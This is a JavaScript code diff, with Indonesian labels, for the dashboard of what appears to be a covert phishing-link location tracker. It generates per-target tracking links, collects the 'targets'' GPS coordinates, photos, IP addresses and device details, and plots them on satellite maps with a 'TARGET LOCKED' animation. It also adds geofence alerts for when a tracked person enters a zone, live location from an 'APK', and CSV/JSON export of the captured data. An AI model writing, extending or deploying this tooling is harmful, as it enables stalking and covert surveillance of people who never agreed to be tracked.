+    if(a.kabupaten)parts.push(a.kabupaten);
+    if(a.provinsi)parts.push(a.provinsi);
+    if(parts.length)return parts.join(', ');
+  }
+  return d.kota||'-';
+}
+
+function updateMultiMap(){
+  if(!mapMulti)return;
+  Object.values(multiMarkers).forEach(m=>mapMulti.removeLayer(m));
+  multiMarkers={};
+  const valid=allData.filter(([,d])=>d.lat&&d.lng);
+  document.getElementById('mapMultiCount').innerText=valid.length+' targets';
+  document.getElementById('multiLabel').innerText='◈ '+valid.length+' TARGET LIVE';
+  const colors=['#ff3355','#c8a000','#00d4ff','#00c853','#ff8f00','#a855f7','#ec4899'];
+  valid.forEach(([key,d],idx)=>{
+    const name=d.target||'unknown';
+    const alamat=buildAlamat(d);
+    const jam=new Date(d.waktu).toLocaleString('id-ID');
+    const clr=colors[idx%colors.length];
+    const isRecent=(Date.now()-d.waktu)<3600000;
+    const m=L.marker([d.lat,d.lng],{icon:pinIcon(d.foto||null,name,clr)}).addTo(mapMulti);
+    const popHtml=`<div style="font-family:'Courier New',monospace;min-width:170px;padding:4px">
+      <div style="color:#c8a000;font-weight:bold;letter-spacing:2px;font-size:11px;padding-bottom:5px;border-bottom:1px solid #4a3a00;margin-bottom:5px">${name.toUpperCase()}</div>
+      ${d.foto?`<img src="${d.foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #4a3a00;border-radius:3px;display:block;margin-bottom:5px">`:''}
+      <div style="font-size:9px;line-height:1.9">
+        <div><span style="color:#444;display:inline-block;width:44px">ALAMAT</span><span style="color:#c8c8c8">${alamat}</span></div>
+        <div><span style="color:#444;display:inline-block;width:44px">KOORD</span><span style="color:#00d4ff">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div>
+        ${d.ip?`<div><span style="color:#444;display:inline-block;width:44px">IP</span><span style="color:#00d4ff">${d.ip}</span></div>`:''}
+        ${d.platform?`<div><span style="color:#444;display:inline-block;width:44px">OS</span><span style="color:#888">${d.platform}</span></div>`:''}
+        <div><span style="color:#444;display:inline-block;width:44px">WAKTU</span><span style="color:#555">${jam}</span></div>
+        <div style="margin-top:3px;color:${isRecent?'#00c853':'#555'}">${isRecent?'● AKTIF (< 1 jam)':'○ Lama'}</div>
+      </div>
+    </div>`;
+    m.bindPopup(popHtml,{className:'target-popup',closeButton:false,maxWidth:240});
+    multiMarkers[key]=m;
+  });
+}
+
+// ══════════════════════════
+// TARGET LOCATION — ANIMASI LEAFLET SATELIT
+// ══════════════════════════
+let mapLink=null,lastAnimKey='';
+
+function animasiMapLink(lat,lng,target,foto){
+  const key=lat.toFixed(4)+'_'+lng.toFixed(4);
+  if(key===lastAnimKey)return;
+  lastAnimKey=key;
+
+  // reset
+  if(mapLink){try{mapLink.remove()}catch(e){}mapLink=null}
+
+  const container=document.getElementById('mapLink');
+  const labelEl=document.getElementById('mapLinkLabel');
+  const coordsEl=document.getElementById('mapLinkCoords');
+  coordsEl.innerText=lat.toFixed(4)+', '+lng.toFixed(4);
+
+  // init map di zoom 2
+  mapLink=L.map(container,{zoomControl:false,attributionControl:false,dragging:false,scrollWheelZoom:false,touchZoom:false,doubleClickZoom:false}).setView([0,20],2);
+  addSatLayer(mapLink);
+
+  // stages zoom-in
+  const stages=[
+    {zoom:2, center:[0,20],   dur:900,  label:'◈ SATELIT ONLINE'},
+    {zoom:4, center:[lat,lng],dur:900,  label:'◈ MENCARI SINYAL...'},
+    {zoom:7, center:[lat,lng],dur:900,  label:'◈ SINYAL DITEMUKAN'},
+    {zoom:10,center:[lat,lng],dur:900,  label:'◈ MENGUNCI WILAYAH'},
+    {zoom:13,center:[lat,lng],dur:900,  label:'◈ MEMPERBESAR...'},
+    {zoom:16,center:[lat,lng],dur:900,  label:'◈ DETAIL JALAN'},
+    {zoom:18,center:[lat,lng],dur:1000, label:'◈ TARGET LOCKED ◈'},
+  ];
+
+  let idx=0;
+  function step(){
+    if(idx>=stages.length){
+      // pasang pin foto
+      const mk=L.marker([lat,lng],{icon:pinIcon(foto||null,target,'#ff3355')}).addTo(mapLink);
+
+      // popup info lengkap
+      const latestData=allData.find(([,d])=>d.lat&&Math.abs(d.lat-lat)<0.0001);
+      const alamat=latestData?buildAlamat(latestData[1]):'-';
+      const fotoHtml=foto?`<img src="${foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #4a3a00;border-radius:3px;display:block;margin-bottom:5px">`:'';
+      mk.bindPopup(`<div style="font-family:'Courier New',monospace;min-width:160px;padding:4px">
+        <div style="color:#c8a000;font-weight:bold;letter-spacing:1px;font-size:11px;padding-bottom:4px;border-bottom:1px solid #4a3a00;margin-bottom:4px">◈ ${target.toUpperCase()}</div>
+        ${fotoHtml}
+        <div style="font-size:9px;line-height:1.9">
+          <div><span style="color:#444;display:inline-block;width:44px">ALAMAT</span><span style="color:#c8c8c8">${alamat}</span></div>
+          <div><span style="color:#444;display:inline-block;width:44px">KOORD</span><span style="color:#00d4ff">${lat.toFixed(5)}, ${lng.toFixed(5)}</span></div>
+        </div>
+      </div>`,{className:'target-popup',closeButton:false,maxWidth:230}).openPopup();
+
+      // aktifkan drag setelah animasi
+      mapLink.dragging.enable();
+      mapLink.scrollWheelZoom.enable();
+      targetLockedSound();
+      hackerVoice();
+      addLog('🎯 Target locked: '+target);
+      return;
+    }
+    const s=stages[idx];
+    labelEl.innerText=s.label;
+    mapLink.flyTo(s.center,s.zoom,{duration:s.dur/1000,easeLinearity:0.25});
+    idx++;
+    setTimeout(step,s.dur+80);
+  }
+  setTimeout(step,300);
+}
+
+// ══════════════════════════
+// GEOFENCE
+// ══════════════════════════
+let geofence=JSON.parse(localStorage.getItem('geofence_'+user)||'null');
+let geoAlerted=new Set(JSON.parse(localStorage.getItem('geoAlerted_'+user)||'[]'));
+if(geofence){document.getElementById('geoStatus').innerText='◈ Aktif: '+geofence.lat.toFixed(4)+', '+geofence.lng.toFixed(4)+' | '+geofence.radius+'m';document.getElementById('geoStatus').style.color='var(--green)'}
+window.setGeofence=()=>{
+  const lat=parseFloat(document.getElementById('geoLat').value);
+  const lng=parseFloat(document.getElementById('geoLng').value);
+  const r=parseInt(document.getElementById('geoRadius').value)||500;
+  if(isNaN(lat)||isNaN(lng)){addLog('[!] Koordinat tidak valid','err');return}
+  geofence={lat,lng,radius:r};localStorage.setItem('geofence_'+user,JSON.stringify(geofence));
+  document.getElementById('geoStatus').innerText='◈ Aktif: '+lat.toFixed(4)+', '+lng.toFixed(4)+' | '+r+'m';
+  document.getElementById('geoStatus').style.color='var(--green)';addLog('Geofence set: '+r+'m');playKlik();
+};
+window.clearGeofence=()=>{
+  geofence=null;geoAlerted=new Set();
+  localStorage.removeItem('geofence_'+user);localStorage.removeItem('geoAlerted_'+user);
+  document.getElementById('geoStatus').innerText='Belum diset';document.getElementById('geoStatus').style.color='';
+  const al=document.getElementById('geoAlert');al.style.display='none';al.innerText='';addLog('Geofence dihapus');
+};
+function haversine(la1,lo1,la2,lo2){const R=6371000,p=Math.PI/180;const dl=(la2-la1)*p,dg=(lo2-lo1)*p;const a=Math.sin(dl/2)**2+Math.cos(la1*p)*Math.cos(la2*p)*Math.sin(dg/2)**2;return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a))}
+function checkGeofence(){
+  if(!geofence)return;
+  allData.forEach(([key,d])=>{
+    if(!d.lat||!d.lng||geoAlerted.has(key))return;
+    const dist=haversine(geofence.lat,geofence.lng,d.lat,d.lng);
+    if(dist<=geofence.radius){
+      geoAlerted.add(key);localStorage.setItem('geoAlerted_'+user,JSON.stringify([...geoAlerted]));
+      const nm=(d.target||'unknown').toUpperCase();
+      addLog('🚨 GEOFENCE! '+nm+' dalam '+Math.round(dist)+'m','warn');
+      geoSound();ucapkan('Target '+nm+' masuk zona. Jarak '+Math.round(dist)+' meter.');
+      const al=document.getElementById('geoAlert');al.style.display='block';al.style.color='var(--red)';
+      al.innerText='🚨 '+nm+' DALAM ZONA ('+Math.round(dist)+'m) — '+new Date().toLocaleTimeString('id-ID');
+    }
+  });
+}
+
+// NOTES
+window.saveNote=(key)=>{localStorage.setItem('note_'+user+'_'+key,document.getElementById('note_'+key)?.value||'');addLog('Note saved')};
+function getNote(key){return localStorage.getItem('note_'+user+'_'+key)||''}
+
+// APK MAP
+let mapApk=null,markerApk=null,lastApkCnt=0,firstApk=true;
+function initMapApk(){mapApk=L.map('mapApk',{zoomControl:false,attributionControl:false,dragging:true,scrollWheelZoom:true}).setView([-4.5,138.5],14);addSatLayer(mapApk)}
+initMapApk();
+
+onValue(ref(db,'lokasi/'+user),snap=>{
+  const data=snap.val();if(!data)return;
+  const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');
+  const ae=Object.entries(data).filter(([k,d])=>d.mode&&!d.target&&!bl.includes(k)).sort((a,b)=>b[1].waktu-a[1].waktu);
+  if(!ae.length)return;
+  const lt=ae[0][1];
+  document.getElementById('apkUser').innerText=lt.user||user;
+  document.getElementById('apkLat').innerText=lt.lat?lt.lat.toFixed(6):'-';
+  document.getElementById('apkLng').innerText=lt.lng?lt.lng.toFixed(6):'-';
+  document.getElementById('apkAkurasi').innerText=lt.akurasi?lt.akurasi.toFixed(2)+' m':'-';
+  document.getElementById('apkDevice').innerText=lt.device||'-';
+  document.getElementById('apkTime').innerText=new Date(lt.waktu).toLocaleString('id-ID');
+  if(lt.lat&&lt.lng){
+    document.getElementById('mapApkCoords').innerText=lt.lat.toFixed(4)+', '+lt.lng.toFixed(4);
+    if(markerApk)markerApk.setLatLng([lt.lat,lt.lng]);
+    else{markerApk=L.marker([lt.lat,lt.lng],{icon:radarIcon()}).addTo(mapApk);markerApk.bindPopup('<div style="font-family:Courier New;text-align:center;padding:6px"><b>'+(lt.user||user).toUpperCase()+'</b><br>'+lt.lat.toFixed(5)+', '+lt.lng.toFixed(5)+'</div>',{className:'target-popup',closeButton:false}).openPopup()}
+    mapApk.setView([lt.lat,lt.lng],mapApk.getZoom());
+  }
+  if(!firstApk&&ae.length>lastApkCnt){apkUpdateSound();addLog('📡 APK kirim lokasi baru!','warn')}
+  lastApkCnt=ae.length;firstApk=false;
+});
+window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=document.getElementById('apkLng').innerText;if(la==='-')return;window.open('https://www.google.com/maps?q='+la+','+ln,'_blank')};
+
+// GENERATE LINK
+let currentLink='';
+window.genLink=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';addLog('Link: '+t);beep(900,.08)};
+window.copyLink=async()=>{if(!currentLink)return;try{await navigator.clipboard.writeText(currentLink);document.getElementById('btnCopy').innerText='[ ✓ Tersalin ]';setTimeout(()=>document.getElementById('btnCopy').innerText='[ 📋 Salin Link ]',2000)}catch(e){}};
+
+// ── ADDED: GENERATE MAPS LINK ──
+let currentLinkMaps='';
+window.genLinkMaps=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLinkMaps=u;document.getElementById('linkUrlMaps').innerText=u;document.getElementById('linkResultMaps').style.display='block';addLog('Link maps: '+t);beep(900,.08)};
+window.copyLinkMaps=async()=>{if(!currentLinkMaps)return;try{await navigator.clipboard.writeText(currentLinkMaps);document.getElementById('btnCopyMaps').innerText='[ ✓ Tersalin ]';setTimeout(()=>document.getElementById('btnCopyMaps').innerText='[ 📋 Salin Link Maps ]',2000)}catch(e){}};
+
+// DATA
+let allData=[],lastCnt=0,firstLoad=true;
+function genID(w){const t=new Date(w);return'TGT-'+t.getFullYear().toString().slice(-2)+String(t.getMonth()+1).padStart(2,'0')+String(t.getDate()).padStart(2,'0')+'-'+String(t.getHours()).padStart(2,'0')+String(t.getMinutes()).padStart(2,'0')+String(t.getSeconds()).padStart(2,'0')}
+
+function getFiltered(){
+  const s=(document.getElementById('searchInput')?.value||'').toLowerCase();
+  const df=document.getElementById('filterDate')?.value||'all';
+  const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');
+  const ts=new Date();ts.setHours(0,0,0,0);
+  return allData.filter(([k,d])=>{
+    if(bl.includes(k))return false;
+    if(d.via==='maps')return false; // ADDED: data maps tampil di kolom MAPS saja
+    if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}
+    if(df==='today'&&d.waktu<ts.getTime())return false;
+    if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;
+    if(df==='30days'&&d.waktu<ts.getTime()-30*86400000)return false;
+    return true;
+  });
+}
+
+function renderData(){
+  const filtered=getFiltered();
+  document.getElementById('countShown').innerText=filtered.length;
+  document.getElementById('countTotal').innerText=allData.filter(([,d])=>d.via!=='maps').length; // ADDED: hitung track saja
+  const c=document.getElementById('hasil');
+  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';return}
+  c.innerHTML=filtered.map(([key,d])=>`
+    <div class="card-data" id="card-${key}">
+      <div class="card-top">
+        <span><span class="card-uname">${d.target||'unknown'}</span> · ${genID(d.waktu)}</span>
+        <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
+      </div>
+      ${d.foto?`<img class="card-photo" src="${d.foto}" crossorigin="anonymous">`:''}
+      <div class="card-body">
+        <div><span class="card-k">NAMA</span><span class="card-v">${d.target||'-'}</span></div>
+        <div><span class="card-k">ALAMAT</span><span class="card-v">${buildAlamat(d)}</span></div>
+        ${d.lat?`
+        <div><span class="card-k">KOORD</span><span class="card-v">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div>
+        <div><span class="card-k">MAPS</span><span class="card-v"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP →</a></span></div>`:''}
+        ${d.ip?`<div><span class="card-k">IP</span><span class="card-v">${d.ip}</span></div>`:''}
+        ${d.suhu!=null?`<div><span class="card-k">SUHU</span><span class="card-v">${Math.round(d.suhu)}°C</span></div>`:''}
+        ${d.baterai?`<div><span class="card-k">BATERAI</span><span class="card-v">${d.baterai}</span></div>`:''}
+        ${d.platform?`<div><span class="card-k">PLATFORM</span><span class="card-v">${d.platform}</span></div>`:''}
+        ${d.screen?`<div><span class="card-k">SCREEN</span><span class="card-v">${d.screen}</span></div>`:''}
+        ${d.timezone?`<div><span class="card-k">TZ</span><span class="card-v">${d.timezone}</span></div>`:''}
+      </div>
+      <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
+      <div class="card-actions">
+        <button onclick="saveNote('${key}')">📝 NOTE</button>
+        <button onclick="zoomMulti(${d.lat},${d.lng})">🗺 MULTI</button>
+        <button onclick="downloadCard('${key}')">📥 SAVE</button>
+        <button class="del" onclick="deleteItem('${key}')">🗑️ DEL</button>
+      </div>
+    </div>`).join('');
+
+  // trigger animasi untuk target terbaru yang punya koordinat
+  const latest=filtered.find(([,d])=>d.lat&&d.lng);
+  if(latest)animasiMapLink(latest[1].lat,latest[1].lng,latest[1].target||'unknown',latest[1].foto||null);
+
+  updateStats();updateMultiMap();checkGeofence();
+}
+
+window.zoomMulti=(lat,lng)=>{if(!mapMulti||!lat||!lng)return;mapMulti.flyTo([lat,lng],14,{duration:1.5});document.getElementById('mapMulti').closest('.term-body').scrollIntoView({behavior:'smooth'})};
+window.filterData=()=>renderData();
+
+window.deleteItem=async(key)=>{playKlik();if(!confirm('Hapus data ini?'))return;const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');if(!bl.includes(key))bl.push(key);localStorage.setItem('blacklist_'+user,JSON.stringify(bl));await remove(ref(db,'lokasi/'+user+'/'+key));addLog('Deleted');renderData()};
+window.clearAll=async()=>{playKlik();if(!confirm('Hapus SEMUA data link?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target&&v.via!=='maps'){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));renderData()};
+window.downloadCard=async(key)=>{const c=document.getElementById('card-'+key);if(!c)return;try{const cv=await html2canvas(c,{backgroundColor:'#161616',scale:2});const a=document.createElement('a');a.download='target_'+key+'.png';a.href=cv.toDataURL();a.click()}catch(e){}};
+window.exportCSV=()=>{const _td=allData.filter(([,d])=>d.via!=='maps');if(!_td.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];_td.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
+window.exportJSON=()=>{const _td=allData.filter(([,d])=>d.via!=='maps');if(!_td.length)return alert('No data');const blob=new Blob([JSON.stringify(_td.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.json';a.click()};
+
+onValue(ref(db,'lokasi/'+user),snap=>{
+  const data=snap.val();
+  if(!data){allData=[];document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';document.getElementById('countShown').innerText='0';document.getElementById('countTotal').innerText='0';updateStats();return}
+  allData=Object.entries(data).filter(([,d])=>d.target).sort((a,b)=>b[1].waktu-a[1].waktu);
+  if(!firstLoad&&allData.length>lastCnt){linkDataSound();addLog('🎯 DATA BARU!','warn')}
+  lastCnt=allData.length;firstLoad=false;renderData();
+});
+
+// ══════════════════════════
+// MAPS LOCATION (ADDED — kolom data maps.html)
+// ══════════════════════════
+let allDataMaps=[],lastCntMaps=0,firstLoadMaps=true;
+let mapMaps=null,lastAnimKeyMaps='';
+
+function getFilteredMaps(){
+  const s=(document.getElementById('searchInputMaps')?.value||'').toLowerCase();
+  const df=document.getElementById('filterDateMaps')?.value||'all';
+  const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');
+  const ts=new Date();ts.setHours(0,0,0,0);
+  return allDataMaps.filter(([k,d])=>{
+    if(bl.includes(k))return false;
+    if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}
+    if(df==='today'&&d.waktu<ts.getTime())return false;
+    if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;
+    if(df==='30days'&&d.waktu<ts.getTime()-30*86400000)return false;
+    return true;
+  });
+}
+
+function animasiMapMaps(lat,lng,target,foto){
+  const key=lat.toFixed(4)+'_'+lng.toFixed(4);
+  if(key===lastAnimKeyMaps)return;
+  lastAnimKeyMaps=key;
+  if(mapMaps){try{mapMaps.remove()}catch(e){}mapMaps=null}
+  const container=document.getElementById('mapMaps');
+  const labelEl=document.getElementById('mapMapsLabel');
+  const coordsEl=document.getElementById('mapMapsCoords');
+  coordsEl.innerText=lat.toFixed(4)+', '+lng.toFixed(4);
+  mapMaps=L.map(container,{zoomControl:false,attributionControl:false,dragging:false,scrollWheelZoom:false,touchZoom:false,doubleClickZoom:false}).setView([0,20],2);
+  addSatLayer(mapMaps);
+  const stages=[
+    {zoom:2, center:[0,20],   dur:900,  label:'◈ SATELIT ONLINE'},
+    {zoom:4, center:[lat,lng],dur:900,  label:'◈ MENCARI SINYAL...'},
+    {zoom:7, center:[lat,lng],dur:900,  label:'◈ SINYAL DITEMUKAN'},
+    {zoom:10,center:[lat,lng],dur:900,  label:'◈ MENGUNCI WILAYAH'},
+    {zoom:13,center:[lat,lng],dur:900,  label:'◈ MEMPERBESAR...'},
+    {zoom:16,center:[lat,lng],dur:900,  label:'◈ DETAIL JALAN'},
+    {zoom:18,center:[lat,lng],dur:1000, label:'◈ MAPS LOCKED ◈'},
+  ];
+  let idx=0;
+  function step(){
+    if(idx>=stages.length){
+      const mk=L.marker([lat,lng],{icon:pinIcon(foto||null,target,'#00d4ff')}).addTo(mapMaps);
+      const fd=allDataMaps.find(([,d])=>d.lat&&Math.abs(d.lat-lat)<0.0001);
+      const alamat=fd?buildAlamat(fd[1]):'-';
+      const fotoHtml=foto?`<img src="${foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #4a3a00;border-radius:3px;display:block;margin-bottom:5px">`:'';
+      mk.bindPopup(`<div style="font-family:'Courier New',monospace;min-width:160px;padding:4px">
+        <div style="color:#00d4ff;font-weight:bold;letter-spacing:1px;font-size:11px;padding-bottom:4px;border-bottom:1px solid #4a3a00;margin-bottom:4px">◈ ${target.toUpperCase()}</div>
+        ${fotoHtml}
+        <div style="font-size:9px;line-height:1.9">
+          <div><span style="color:#444;display:inline-block;width:44px">ALAMAT</span><span style="color:#c8c8c8">${alamat}</span></div>
+          <div><span style="color:#444;display:inline-block;width:44px">KOORD</span><span style="color:#00d4ff">${lat.toFixed(5)}, ${lng.toFixed(5)}</span></div>
+        </div>
+      </div>`,{className:'target-popup',closeButton:false,maxWidth:230}).openPopup();
+      mapMaps.dragging.enable();
+      mapMaps.scrollWheelZoom.enable();
+      targetLockedSound();
+      hackerVoice();
+      addLog('🗺️ Maps locked: '+target);
+      return;
+    }
+    const s=stages[idx];
+    labelEl.innerText=s.label;
+    mapMaps.flyTo(s.center,s.zoom,{duration:s.dur/1000,easeLinearity:0.25});
+    idx++;
+    setTimeout(step,s.dur+80);
+  }
+  setTimeout(step,300);
+}
+
+function renderDataMaps(){
+  const filtered=getFilteredMaps();
+  document.getElementById('countShownMaps').innerText=filtered.length;
+  document.getElementById('countTotalMaps').innerText=allDataMaps.length;
+  const c=document.getElementById('hasilMaps');
+  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';return}
+  c.innerHTML=filtered.map(([key,d])=>`
+    <div class="card-data" id="card-${key}">
+      <div class="card-top">
+        <span><span class="card-uname">${d.target||'unknown'}</span> · ${genID(d.waktu)}</span>
+        <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
+      </div>
+      ${d.foto?`<img class="card-photo" src="${d.foto}" crossorigin="anonymous">`:''}
+      <div class="card-body">
+        <div><span class="card-k">NAMA</span><span class="card-v">${d.target||'-'}</span></div>
+        <div><span class="card-k">ALAMAT</span><span class="card-v">${buildAlamat(d)}</span></div>
+        ${d.lat?`
+        <div><span class="card-k">KOORD</span><span class="card-v">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div>
+        <div><span class="card-k">MAPS</span><span class="card-v"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP →</a></span></div>`:''}
+        ${d.ip?`<div><span class="card-k">IP</span><span class="card-v">${d.ip}</span></div>`:''}
+        ${d.suhu!=null?`<div><span class="card-k">SUHU</span><span class="card-v">${Math.round(d.suhu)}°C</span></div>`:''}
+        ${d.baterai?`<div><span class="card-k">BATERAI</span><span class="card-v">${d.baterai}</span></div>`:''}
+        ${d.platform?`<div><span class="card-k">PLATFORM</span><span class="card-v">${d.platform}</span></div>`:''}
+        ${d.screen?`<div><span class="card-k">SCREEN</span><span class="card-v">${d.screen}</span></div>`:''}
+        ${d.timezone?`<div><span class="card-k">TZ</span><span class="card-v">${d.timezone}</span></div>`:''}
+      </div>
+      <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
+      <div class="card-actions">
+        <button onclick="saveNote('${key}')">📝 NOTE</button>
+        <button onclick="zoomMulti(${d.lat},${d.lng})">🗺 MULTI</button>
+        <button onclick="downloadCard('${key}')">📥 SAVE</button>
+        <button class="del" onclick="deleteItemMaps('${key}')">🗑️ DEL</button>
+      </div>
+    </div>`).join('');
+
+  const latest=filtered.find(([,d])=>d.lat&&d.lng);
+  if(latest)animasiMapMaps(latest[1].lat,latest[1].lng,latest[1].target||'unknown',latest[1].foto||null);
+}
+window.filterDataMaps=()=>renderDataMaps();
+window.deleteItemMaps=(key)=>{deleteItem(key).then(()=>{try{renderDataMaps()}catch(e){}}).catch(()=>{})};
+window.clearAllMaps=async()=>{playKlik();if(!confirm('Hapus SEMUA data maps?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target&&v.via==='maps'){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));renderDataMaps()};
+window.exportCSVMaps=()=>{if(!allDataMaps.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];allDataMaps.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_maps_'+Date.now()+'.csv';a.click()};
+window.exportJSONMaps=()=>{if(!allDataMaps.length)return alert('No data');const blob=new Blob([JSON.stringify(allDataMaps.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_maps_'+Date.now()+'.json';a.click()};
+
+onValue(ref(db,'lokasi/'+user),snap=>{
+  const data=snap.val()||{};
+  allDataMaps=Object.entries(data).filter(([,d])=>d&&d.target&&d.via==='maps').sort((a,b)=>(b[1].waktu||0)-(a[1].waktu||0));
+  if(!firstLoadMaps&&allDataMaps.length>lastCntMaps){linkDataSound();addLog('🗺️ DATA BARU MAPS!','warn')}
+  lastCntMaps=allDataMaps.length;firstLoadMaps=false;renderDataMaps();
+});
+addLog('Maps module ready');
+
+// ══════════════════════════
+// CHAT
+// ══════════════════════════
+var chatOpen=false,chatFirst=true,chatLast=0;
+var lawan=localStorage.getItem('lawanChat_'+user)||'';
+var sub1=null,sub2=null,room1data=null,room2data=null;
+window.openChat=function(){playKlik();document.getElementById('chatPanel').classList.add('show');chatOpen=true;document.getElementById('chatBadge').style.display='none';if(!lawan)setTimeout(pilihLawan,300);else{setTitle();loadChat();setTimeout(()=>{scrollChat();document.getElementById('chatInput').focus()},300)}};
+window.closeChat=function(){playKlik();document.getElementById('chatPanel').classList.remove('show');chatOpen=false};
+function setTitle(){const e=document.getElementById('chatTitle');if(e)e.innerText=lawan?('◉ CHAT: '+lawan.toUpperCase()):'◉ PRIVATE CHAT'}
+window.pilihLawan=async function(){playKlik();try{const res=await fetch('https://infocuaca.online/users.json');const users=await res.json();const list=Object.keys(users).filter(u=>u!==user);if(!list.length){alert('Tidak ada user lain');return}const pilih=prompt('Pilih lawan:\n'+list.map((u,i)=>(i+1)+'. '+u).join('\n')+'\n\nKetik nama user:');if(pilih&&list.includes(pilih.trim())){lawan=pilih.trim();localStorage.setItem('lawanChat_'+user,lawan);setTitle();chatLast=0;chatFirst=true;room1data=null;room2data=null;loadChat();addLog('Chat: '+lawan)}else if(pilih)alert('User tidak ditemukan')}catch(e){alert('Error: '+e.message)}};
+function loadChat(){if(!lawan)return;const r1=user+'_'+lawan,r2=lawan+'_'+user;if(sub1)try{sub1()}catch(e){}if(sub2)try{sub2()}catch(e){}room1data=null;room2data=null;sub1=onValue(ref(db,'chat/'+r1),s=>{room1data=s.val();renderChat()});sub2=onValue(ref(db,'chat/'+r2),s=>{room2data=s.val();renderChat()})}
+function renderChat(){const c=document.getElementById('chatMsgs');let msgs=[];[room1data,room2data].forEach(r=>{if(r)Object.keys(r).forEach(k=>msgs.push([k,r[k]]))});const seen={};msgs=msgs.filter(([k])=>seen[k]?false:(seen[k]=true));msgs.sort((a,b)=>a[1].waktu-b[1].waktu);if(!msgs.length){c.innerHTML='<div class="empty">Belum ada pesan dengan '+lawan+'</div>';chatLast=0;return}if(!chatFirst&&msgs.length>chatLast&&!chatOpen){const b=document.getElementById('chatBadge');b.style.display='inline-block';b.innerText=msgs.length-chatLast;chatNotifSound();addLog('💬 Chat baru dari '+lawan,'warn')}chatLast=msgs.length;chatFirst=false;c.innerHTML=msgs.map(([k,d])=>{const m=d.user===user;const t=new Date(d.waktu).toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});const tx=String(d.pesan).replace(/</g,'&lt;').replace(/>/g,'&gt;');return`<div class="chat-msg ${m?'mine':''}"><div class="mhead"><span class="muser">${d.user}</span><span>${t}${m?` <button class="mdel" onclick="deleteChat('${k}')">🗑️</button>`:''}</span></div><div class="mtext">${tx}</div></div>`}).join('');if(chatOpen)scrollChat()}
+window.sendChat=async function(){playKlik();const i=document.getElementById('chatInput');const m=i.value.trim();if(!m||!lawan)return;i.value='';try{await push(ref(db,'chat/'+user+'_'+lawan),{user,penerima:lawan,pesan:m,waktu:Date.now()});addLog('✓ Pesan terkirim ke '+lawan)}catch(e){addLog('✗ Error: '+e.message,'err')}};
